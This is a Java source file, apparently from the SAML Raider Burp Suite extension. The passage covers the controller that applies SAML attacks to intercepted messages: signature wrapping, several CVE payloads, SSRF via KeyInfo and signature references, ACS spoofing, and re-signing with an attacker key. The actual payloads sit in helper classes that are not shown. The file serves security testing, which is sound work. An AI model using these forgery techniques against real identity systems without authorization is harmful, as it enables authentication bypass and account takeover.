package application;

import application.SamlMessageAnalyzer.SamlMessageAnalysisResult;
import burp.BurpExtender;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.Selection;
import burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;
import gui.CVEHelpWindow;
import gui.EncryptAssertionDialog;
import gui.SamlMain;
import gui.SamlPanelInfo;
import gui.SamlXmlEditor;
import gui.SignatureHelpWindow;
import gui.XSWHelpWindow;
import helpers.AssertionManipulator;
import helpers.CommentInjection;
import helpers.CVE_2022_41912;
import helpers.CVE_2024_45409;
import helpers.CVE_2025_23369;
import helpers.CVE_2025_25291;
import helpers.CVE_2025_25292;
import helpers.ACSSpoof;
import helpers.DigestTamper;
import helpers.DupeKeyConfusion;
import helpers.EncryptionSSRF;
import helpers.HMACConfusion;
import helpers.IssuerConfusion;
import helpers.KeyInfoSSRF;
import helpers.PIInjection;
import helpers.ResponseXSS;
import helpers.SignatureRefSSRF;
import helpers.XMLHelpers;
import helpers.XSLTPayloads;
import helpers.XSWHelpers;
import java.awt.Component;
import java.awt.Desktop;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.spec.InvalidKeySpecException;
import java.util.HashMap;
import java.util.List;
import javax.xml.crypto.MarshalException;
import javax.xml.crypto.dsig.XMLSignatureException;
import javax.xml.parsers.ParserConfigurationException;
import model.BurpCertificate;
import org.w3c.dom.DOMException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import static java.util.Objects.requireNonNull;

public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Observer {

    public static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
    public static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
    public static final String XXE_CONTENT_APPLIED = "XXE content applied";
    public static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
    public static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
    public static final String XML_NOT_SUITABLE_FOR_XSLT = "This XML Message is not suitable for this particular XSLT attack";
    public static final String XML_COULD_NOT_SIGN = "Could not sign XML";
    public static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
    public static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported.";
    public static final String XML_NOT_SUITABLE_FOR_XSW = "This XML Message is not suitable for this particular XSW, is there a signature?";
    public static final String NO_BROWSER = "Could not open diff in Browser. Path to file was copied to clipboard";
    public static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";

    private final CertificateTabController certificateTabController;
    private XMLHelpers xmlHelpers;
    private HttpRequestResponse requestResponse;
    private SamlMessageAnalysisResult samlMessageAnalysisResult;
    private String orgSAMLMessage;
    private String samlMessage;
    private SamlXmlEditor textArea;
    private SamlMain samlGUI;
    private boolean editable;
    private XSWHelpers xswHelpers;
    private boolean isEdited = false;

    // Signature staleness tracking
    private boolean hadSignature = false;   // original message contained a <Signature> element
    private boolean signatureIsStale = false;
    // Remembered original X509Certificate from the *pre-attack* KeyInfo.
    // Captured at setRequestResponse time so Dupe-Key Confusion can restore
    // the victim identity after the user re-signs with an attacker key.
    private String originalX509Cert = null;
    // X509IssuerName extracted verbatim from the original EncryptedAssertion's KeyInfo.
    // Preserved so Encrypt Assertion can reproduce the exact DN format the target IdP uses,
    // rather than recomputing it via Java's RFC 2253 serialization.
    private String capturedIssuerName = null;

    public SamlTabController(boolean editable, CertificateTabController certificateTabController) {
        this.certificateTabController = requireNonNull(certificateTabController, "certificateTabController");
        this.editable = editable;
        samlGUI = new SamlMain(this);
        textArea = samlGUI.getXmlEditorAction();
        textArea.setEditable(editable);
        // Manual edits in the editor mark the signature stale (same as applying an attack).
        textArea.setOnUserEditCallback(this::markSignatureStale);
        xmlHelpers = new XMLHelpers();
        xswHelpers = new XSWHelpers();
        this.certificateTabController.addObserver(this);
    }

    @Override
    public HttpRequest getRequest() {
        var request = this.requestResponse.request();

        if (isModified()) {
            if (this.samlMessageAnalysisResult.isSOAPMessage()) {
                try {
                    // TODO Only working with getString for both documents,
                    // otherwise namespaces and attributes are emptied -.-
                    var response = this.requestResponse.response();
                    int bodyOffset = response.bodyOffset();
                    var byteMessage = this.requestResponse.response().toByteArray().getBytes();
                    String HTTPHeader = new String(byteMessage, 0, bodyOffset, StandardCharsets.UTF_8);

                    String soapMessage = requestResponse.response().bodyToString();
                    Document soapDocument = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
                    Element soapBody = xmlHelpers.getSOAPBody(soapDocument);
                    xmlHelpers.getString(soapDocument); // Why?
                    Document samlDocumentEdited = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);
                    xmlHelpers.getString(samlDocumentEdited); // Why?
                    Element samlResponse = (Element) samlDocumentEdited.getFirstChild();
                    soapDocument.adoptNode(samlResponse);
                    Element soapFirstChildOfBody = (Element) soapBody.getFirstChild();
                    soapBody.replaceChild(samlResponse, soapFirstChildOfBody);
                    String wholeMessage = HTTPHeader + xmlHelpers.getString(soapDocument);
                    byteMessage = wholeMessage.getBytes(StandardCharsets.UTF_8);
                    request = HttpRequest.httpRequest(ByteArray.byteArray(byteMessage));
                } catch (IOException e) {
                    BurpExtender.api.logging().logToError(e);
                } catch (SAXException e) {
                    setInfoMessageText(XML_NOT_WELL_FORMED);
                }
            } else {
                String textMessage = textArea.getText();

                String parameterToUpdate;
                if (this.samlMessageAnalysisResult.isWSSMessage()) {
                    parameterToUpdate = "wresult";
                } else if (this.samlMessageAnalysisResult.isSAMLRequest()) {
                    parameterToUpdate = certificateTabController.getSamlRequestParameterName();
                } else {
                    parameterToUpdate = certificateTabController.getSamlResponseParameterName();
                }

                HttpParameterType parameterType;
                if (request.method().equals("GET")) {
                    parameterType = HttpParameterType.URL;
                } else {
                    parameterType = HttpParameterType.BODY;
                }

                HttpParameter newParameter =
                        HttpParameter.parameter(
                                parameterToUpdate,
                                SamlMessageEncoder.getEncodedSAMLMessage(
                                        textMessage,
                                        this.samlMessageAnalysisResult.isWSSMessage(),
                                        this.samlMessageAnalysisResult.isWSSUrlEncoded(),
                                        this.samlMessageAnalysisResult.isInflated(),
                                        this.samlMessageAnalysisResult.isGZip()),
                                parameterType);

                request = request.withUpdatedParameters(newParameter);
            }
        }
        return request;
    }

    @Override
    public Selection selectedData() {
        String sel = textArea.selectedText();
        if (sel != null && !sel.isEmpty()) {
            return Selection.selection(ByteArray.byteArray(sel));
        }
        return null;
    }

    @Override
    public String caption() {
        return "SAML Raider";
    }

    @Override
    public Component uiComponent() {
        return samlGUI;
    }

    @Override
    public boolean isEnabledFor(HttpRequestResponse requestResponse) {
        var samlMessageAnalysisResult =
                SamlMessageAnalyzer.analyze(
                        requestResponse.request(),
                        this.certificateTabController.getSamlRequestParameterName(),
                        this.certificateTabController.getSamlResponseParameterName());

        return samlMessageAnalysisResult.isSAMLMessage();
    }


    @Override
    public boolean isModified() {
        return textArea.isModified() || isEdited;
    }

    @Override
    public void setRequestResponse(HttpRequestResponse requestResponse) {
        this.requestResponse = requestResponse;
        resetInfoMessageText();
        isEdited = false;
        if (requestResponse == null) {
            textArea.setText("");
            textArea.setEditable(false);
            textArea.resetModified();
            setGUIEditable(false);
            resetInformationDisplay();
        } else {
            this.samlMessageAnalysisResult =
                    SamlMessageAnalyzer.analyze(
                            requestResponse.request(),
                            this.certificateTabController.getSamlRequestParameterName(),
                            this.certificateTabController.getSamlResponseParameterName());

            try {
                if (this.samlMessageAnalysisResult.isSOAPMessage()) {
                    String soapMessage = requestResponse.response().bodyToString();
                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
                    Document documentSAML = xmlHelpers.getSAMLResponseOfSOAP(document);
                    samlMessage = xmlHelpers.getStringOfDocument(documentSAML);
                } else if (this.samlMessageAnalysisResult.isWSSMessage()) {
                    var parameterValue = requestResponse.request().parameterValue("wresult", HttpParameterType.BODY);
                    var decodedSAMLMessage =
                            SamlMessageDecoder.getDecodedSAMLMessage(
                                    parameterValue,
                                    this.samlMessageAnalysisResult.isWSSMessage(),
                                    this.samlMessageAnalysisResult.isWSSUrlEncoded());
                    this.samlMessage = decodedSAMLMessage.message();
                } else {
                    var httpParamType =
                            this.samlMessageAnalysisResult.isURLParam()
                                    ? HttpParameterType.URL
                                    : HttpParameterType.BODY;

                    var paramName =
                            this.samlMessageAnalysisResult.isSAMLRequest()
                                    ? certificateTabController.getSamlRequestParameterName()
                                    : certificateTabController.getSamlResponseParameterName();
                    var parameterValue = SamlMessageAnalyzer.extractParameterValue(
                            requestResponse.request(), paramName, httpParamType);

                    var decodedSAMLMessage =
                            SamlMessageDecoder.getDecodedSAMLMessage(
                                    parameterValue,
                                    this.samlMessageAnalysisResult.isWSSMessage(),
                                    this.samlMessageAnalysisResult.isWSSUrlEncoded());

                    this.samlMessage = decodedSAMLMessage.message();
                }
            } catch (IOException e) {
                BurpExtender.api.logging().logToError(e);
                setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            } catch (SAXException e) {
                BurpExtender.api.logging().logToError(e);
                setInfoMessageText(XML_NOT_WELL_FORMED);
                samlMessage = "<error>" + XML_NOT_WELL_FORMED + "</error>";
            } catch (ParserConfigurationException e) {
                BurpExtender.api.logging().logToError(e);
            }

            setInformationDisplay();
            updateCertificateList();
            updateXSWList();
            orgSAMLMessage = samlMessage;

            // Detect whether the loaded message has a signature so staleness can be tracked.
            // Also remember the original X509Certificate for Dupe Key Confusion.
            // Also capture the X509IssuerName verbatim from any EncryptedAssertion so
            // Encrypt Assertion can reproduce the exact DN format the target IdP used.
            hadSignature = false;
            originalX509Cert = null;
            capturedIssuerName = null;
            try {
                Document sigDoc = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);
                hadSignature = sigDoc.getElementsByTagNameNS("*", "Signature").getLength() > 0;
                if (hadSignature) {
                    originalX509Cert = xmlHelpers.getCertificate(sigDoc.getDocumentElement());
                }
                org.w3c.dom.NodeList issuerNames = sigDoc.getElementsByTagNameNS(
                        "http://www.w3.org/2000/09/xmldsig#", "X509IssuerName");
                if (issuerNames.getLength() > 0) {
                    capturedIssuerName = issuerNames.item(0).getTextContent().trim();
                }
            } catch (Exception ignored) {}
            signatureIsStale = false;
            samlGUI.getActionPanel().setSignatureStatus(false);

            // Show prettified XML (editable) for sanity when working with big SAML blobs.
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            textArea.setEditable(editable);

            setGUIEditable(editable);
        }
    }

    private String prettifyXmlOrFallback(String xml) {
        try {
            Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(xml);
            return xmlHelpers.getStringOfDocument(doc, 2);
        } catch (Exception ignored) {
            return xml;
        }
    }

    private void setInformationDisplay() {
        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
        infoPanel.clearAll();

        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

            infoPanel.setIssuer(xmlHelpers.getIssuer(document));
            infoPanel.setResponseDestination(xmlHelpers.getResponseAttribute(document, "Destination"));
            infoPanel.setResponseIssueInstant(xmlHelpers.getResponseAttribute(document, "IssueInstant"));
            infoPanel.setResponseInResponseTo(xmlHelpers.getResponseAttribute(document, "InResponseTo"));
            infoPanel.setResponseStatus(xmlHelpers.getStatusCode(document));

            NodeList assertions = xmlHelpers.getAssertions(document);
            if (assertions.getLength() > 0) {
                Node assertion = assertions.item(0);
                infoPanel.setSubject(xmlHelpers.getSubjectNameID(assertion));
                infoPanel.setConditionNotBefore(xmlHelpers.getConditionNotBefore(assertion));
                infoPanel.setConditionNotAfter(xmlHelpers.getConditionNotAfter(assertion));
                infoPanel.setSubjectConfNotBefore(xmlHelpers.getSubjectConfNotBefore(assertion));
                infoPanel.setSubjectConfNotAfter(xmlHelpers.getSubjectConfNotAfter(assertion));
                infoPanel.setSignatureAlgorithm(xmlHelpers.getSignatureAlgorithm(assertion));
                infoPanel.setDigestAlgorithm(xmlHelpers.getDigestAlgorithm(assertion));
            } else {
                NodeList encrypted = xmlHelpers.getEncryptedAssertions(document);
                if (encrypted.getLength() > 0) {
                    Node enc = encrypted.item(0);
                    infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(enc));
                    infoPanel.setKeyTransport(xmlHelpers.getKeyTransportAlgorithm(enc));
                    infoPanel.setKeyIdentifier(xmlHelpers.getEncryptionKeyIdentifier(enc));
                }
            }
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        }
    }

    private void resetInformationDisplay() {
        samlGUI.getInfoPanel().clearAll();
    }


    public void removeSignature() {
        resetInfoMessageText();
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
            if (xmlHelpers.removeAllSignatures(document) > 0) {
                samlMessage = xmlHelpers.getStringOfDocument(document);
                textArea.setText(prettifyXmlOrFallback(samlMessage));
                isEdited = true;
                setInfoMessageText("Message signature successful removed");
                clearSignatureStaleness();
            } else {
                setInfoMessageText("No Signatures available to remove");
            }
        } catch (SAXException e1) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        }
    }

    public void formatXml() {
        resetInfoMessageText();
        String current = textArea.getText();
        String formatted = prettifyXmlOrFallback(current);
        if (formatted.equals(current)) {
            setInfoMessageText("XML is already formatted (or not well-formed)");
        } else {
            textArea.setText(formatted);
            setInfoMessageText("XML formatted");
        }
    }

    public void resetMessage() {
        samlMessage = orgSAMLMessage;
        textArea.setText(prettifyXmlOrFallback(samlMessage));
        textArea.resetModified();
        samlGUI.getStatusPanel().setText("");
        isEdited = false;
        clearSignatureStaleness();
    }

    public void resignAssertion() {
        try {
            resetInfoMessageText();
            BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
            if (cert != null) {
                setInfoMessageText("Signing...");
                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
                NodeList assertions = xmlHelpers.getAssertions(document);
                String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
                String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));

                xmlHelpers.removeAllSignatures(document);
                String string = xmlHelpers.getString(document);
                Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
                xmlHelpers.removeEmptyTags(doc);
                xmlHelpers.signAssertion(doc, signAlgorithm, digestAlgorithm, cert.getCertificate(), cert.getPrivateKey());
                samlMessage = xmlHelpers.getStringOfDocument(doc);
                textArea.setText(prettifyXmlOrFallback(samlMessage));
                isEdited = true;
                setInfoMessageText("Assertions successfully signed");
                clearSignatureStaleness();
            } else {
                setInfoMessageText("no certificate chosen to sign");
            }
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
            BurpExtender.api.logging().logToError(e);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            BurpExtender.api.logging().logToError(e);
        } catch (Exception e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void resignMessage() {
        try {
            resetInfoMessageText();
            if (this.samlMessageAnalysisResult.isWSSMessage()) {
                setInfoMessageText("Message signing is not possible with WS-Security messages");
            } else {
                setInfoMessageText("Signing...");
                BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
                if (cert != null) {
                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
                    NodeList responses = xmlHelpers.getResponse(document);
                    String signAlgorithm = xmlHelpers.getSignatureAlgorithm(responses.item(0));
                    String digestAlgorithm = xmlHelpers.getDigestAlgorithm(responses.item(0));

                    xmlHelpers.removeOnlyMessageSignature(document);
                    xmlHelpers.signMessage(document, signAlgorithm, digestAlgorithm, cert.getCertificate(), cert.getPrivateKey());
                    samlMessage = xmlHelpers.getStringOfDocument(document);
                    textArea.setText(prettifyXmlOrFallback(samlMessage));
                    isEdited = true;
                    setInfoMessageText("Message successfully signed");
                    clearSignatureStaleness();
                } else {
                    setInfoMessageText("no certificate chosen to sign");
                }
            }
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            BurpExtender.api.logging().logToError(e);
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
            BurpExtender.api.logging().logToError(e);
        } catch (CertificateException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
            BurpExtender.api.logging().logToError(e);
        } catch (NoSuchAlgorithmException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN + ", no such algorithm");
            BurpExtender.api.logging().logToError(e);
        } catch (InvalidKeySpecException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN + ", invalid private key");
            BurpExtender.api.logging().logToError(e);
        } catch (MarshalException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            BurpExtender.api.logging().logToError(e);
        } catch (XMLSignatureException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
            BurpExtender.api.logging().logToError(e);
        }
    }

    private void setInfoMessageText(String infoMessage) {
        samlGUI.getStatusPanel().setText(infoMessage);
    }

    public String getInfoMessageText() {
        return samlGUI.getStatusPanel().getText();
    }

    private void resetInfoMessageText() {
        samlGUI.getStatusPanel().setText("");
    }

    private void updateCertificateList() {
        List<BurpCertificate> list = certificateTabController.getAllCertificates();
        samlGUI.getActionPanel().setCertificateList(list);
    }

    private void updateXSWList() {
        samlGUI.getActionPanel().setXSWList(XSWHelpers.xswTypes);
    }

    public void sendToCertificatesTab() {
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
            String cert = xmlHelpers.getCertificate(document.getDocumentElement());
            if (cert != null) {
                certificateTabController.importCertificateFromString(cert);
            } else {
                setInfoMessageText(XML_CERTIFICATE_NOT_FOUND);
            }
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        }
    }

    public void showXSWPreview() {
        try {
            String current = textArea.getText();
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(current);
            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
            String after = xmlHelpers.getStringOfDocument(document);
            String diff = xswHelpers.diffLineMode(current, after);

            File file = File.createTempFile("tmp", ".html", null);
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            file.deleteOnExit();
            fileOutputStream.write(diff.getBytes(StandardCharsets.UTF_8));
            fileOutputStream.flush();
            fileOutputStream.close();

            URI uri = file.toURI();

            Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
            if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
                desktop.browse(uri);
            } else {
                StringSelection stringSelection = new StringSelection(uri.toString());
                Clipboard clpbrd = Toolkit.getDefaultToolkit().getSystemClipboard();
                clpbrd.setContents(stringSelection, null);
                setInfoMessageText(NO_BROWSER);
            }

        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (DOMException e) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
        } catch (MalformedURLException e) {
            BurpExtender.api.logging().logToError(e);
        } catch (IOException e) {
            setInfoMessageText(NO_DIFF_TEMP_FILE);
        }
    }

    public void applyCVE() {
        try {
            var cve = samlGUI.getActionPanel().getSelectedCVE();
            String current = textArea.getText();
            switch (cve) {
                case CVE_2022_41912.CVE:
                    samlMessage = CVE_2022_41912.apply(current);
                    textArea.setText(prettifyXmlOrFallback(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    markSignatureStale();
                    break;
                case CVE_2025_23369.CVE:
                    samlMessage = CVE_2025_23369.apply(current);
                    textArea.setText(prettifyXmlOrFallback(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    markSignatureStale();
                    break;
                case CVE_2025_25291.CVE:
                    samlMessage = CVE_2025_25291.apply(current);
                    textArea.setText(prettifyXmlOrFallback(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    markSignatureStale();
                    break;
                case CVE_2025_25292.CVE:
                    samlMessage = CVE_2025_25292.apply(current);
                    textArea.setText(prettifyXmlOrFallback(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    markSignatureStale();
                    break;
                case CVE_2024_45409.CVE:
                    samlMessage = CVE_2024_45409.apply(current);
                    textArea.setText(prettifyXmlOrFallback(samlMessage));
                    isEdited = true;
                    setInfoMessageText("%s applied".formatted(cve));
                    markSignatureStale();
                    break;
            }
        } catch (Exception exc) {
            setInfoMessageText(exc.getMessage());
            BurpExtender.api.logging().logToError(exc);
        }
    }

    public void applyCommentInjection(CommentInjection.Position position) {
        try {
            // Comment injection inserts nodes that exclusive C14N strips before digest
            // computation, so the existing signature remains valid — do not mark stale.
            samlMessage = CommentInjection.apply(textArea.getText(), position);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("Comment injected (" + position.name() + ") — signature remains valid via C14N");
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyHMACConfusion() {
        try {
            samlMessage = HMACConfusion.apply(textArea.getText());
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("HMAC confusion applied — SignatureMethod swapped to HMAC-SHA256");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyRefreshTimestamps() {
        try {
            samlMessage = AssertionManipulator.refreshTimestamps(textArea.getText());
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("Timestamps refreshed — window: now−1h to now+1h");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyExtendValidity(int hours) {
        try {
            samlMessage = AssertionManipulator.extendValidity(textArea.getText(), hours);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("Validity extended by " + hours + "h — re-sign if the assertion is signed");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyStatusSuccess() {
        try {
            samlMessage = AssertionManipulator.forceStatusSuccess(textArea.getText());
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("StatusCode set to Success");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyEncryptAssertion() {
        var cert = samlGUI.getActionPanel().getSelectedCertificate();
        if (cert == null || cert.getCertificate() == null) {
            setInfoMessageText("Select the SP's certificate in the Certificate dropdown first (import via Import Metadata).");
            return;
        }
        try {
            String xml = textArea.getText();
            Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(xml);

            if (doc.getElementsByTagNameNS("*", "Assertion").getLength() == 0) {
                // No plaintext assertion present — offer to build one from response metadata.
                String issuer      = xmlHelpers.getIssuer(doc);
                String destination = xmlHelpers.getResponseAttribute(doc, "Destination");
                String audience    = deriveAudience(destination);
                String nameIdFmt   = "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress";

                var dialog = new EncryptAssertionDialog(
                        BurpExtender.api.userInterface().swingUtils().suiteFrame(),
                        issuer, nameIdFmt, destination, audience);
                dialog.setVisible(true);
                if (!dialog.isConfirmed()) return;

                String nameId = dialog.getNameId();
                if (nameId.isBlank()) {
                    setInfoMessageText("NameID is required.");
                    return;
                }

                String assertionXml = helpers.AssertionBuilder.build(
                        dialog.getIssuer(), nameId, dialog.getNameIdFormat(),
                        dialog.getRecipient(), dialog.getAudience());

                // Import the built assertion into the Response DOM, replacing
                // any EncryptedAssertion or appending to the Response element.
                Document assertionDoc = xmlHelpers.getXMLDocumentOfSAMLMessage(assertionXml);
                Node assertionNode = doc.importNode(assertionDoc.getDocumentElement(), true);

                NodeList encAssertions = doc.getElementsByTagNameNS("*", "EncryptedAssertion");
                if (encAssertions.getLength() > 0) {
                    Node enc = encAssertions.item(0);
                    enc.getParentNode().replaceChild(assertionNode, enc);
                } else {
                    NodeList responses = xmlHelpers.getResponse(doc);
                    if (responses.getLength() > 0) responses.item(0).appendChild(assertionNode);
                }

                xml = xmlHelpers.getString(doc);
            }

            var keyInfoStyle = samlGUI.getActionPanel().getSelectedKeyInfoStyle();
            samlMessage = helpers.AssertionEncryptor.encrypt(xml, cert.getCertificate(), keyInfoStyle, capturedIssuerName);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("Assertion encrypted with: " + cert.getCertificate().getSubjectX500Principal().getName());
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    private static String deriveAudience(String destination) {
        if (destination == null || destination.isBlank()) return "";
        // Strip ACS path suffix (e.g. /saml/SSO) to get the SP entity ID
        int idx = destination.indexOf("/saml/");
        if (idx > 0) return destination.substring(0, idx);
        int slash = destination.lastIndexOf('/');
        if (slash > 8) return destination.substring(0, slash);
        return destination;
    }

    public void applyRemoveAudience() {
        try {
            samlMessage = AssertionManipulator.removeAudienceRestriction(textArea.getText());
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("AudienceRestriction removed");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyDigestTamper() {
        try {
            samlMessage = DigestTamper.apply(textArea.getText());
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("DigestValue corrupted — forward to test SP signature verification");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyKeyInfoSSRF(String retrievalUrl) {
        try {
            samlMessage = KeyInfoSSRF.apply(textArea.getText(), retrievalUrl);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("KeyInfo replaced with RetrievalMethod → " + retrievalUrl);
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyEncryptionSSRF(EncryptionSSRF.Mode mode, String url) {
        try {
            samlMessage = EncryptionSSRF.apply(textArea.getText(), mode, url);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText(mode.name() + " → " + url);
            // Outer Response signature covers the EncryptedAssertion subtree; mutating
            // its internals invalidates any enclosing signature.
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applySignatureRefSSRF(SignatureRefSSRF.Mode mode, String url) {
        try {
            samlMessage = SignatureRefSSRF.apply(textArea.getText(), mode, url);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText(mode.name() + " → " + url);
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyPIInjection(PIInjection.Position position) {
        try {
            // Processing instructions may or may not be stripped by c14n depending on
            // algorithm — mark stale to be safe.
            samlMessage = PIInjection.apply(textArea.getText(), position);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("Processing instruction injected (" + position.name() + ")");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyIssuerConfusion(IssuerConfusion.Mode mode) {
        try {
            samlMessage = IssuerConfusion.apply(textArea.getText(), mode);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("Issuer mutated (" + mode.name() + ")");
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyACSSpoof(String attackerUrl) {
        try {
            samlMessage = ACSSpoof.apply(textArea.getText(), attackerUrl);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("AssertionConsumerServiceURL → " + attackerUrl);
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyDupeKeyConfusion() {
        try {
            BurpCertificate attackerCert = samlGUI.getActionPanel().getSelectedCertificate();
            if (attackerCert == null) {
                setInfoMessageText("Pick an attacker cert (with private key) in the Signing dropdown first.");
                return;
            }
            if (originalX509Cert == null || originalX509Cert.isBlank()) {
                setInfoMessageText("Could not find the original X509Certificate — was the loaded message signed?");
                return;
            }
            // Step 1: re-sign the assertion with the attacker key so the signature verifies under it.
            resignAssertion();
            // Step 2: rewrite KeyInfo — attacker RSAKeyValue first, original X509 second.
            samlMessage = DupeKeyConfusion.apply(textArea.getText(), attackerCert, originalX509Cert);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("Dupe Key Confusion applied — forward as-is");
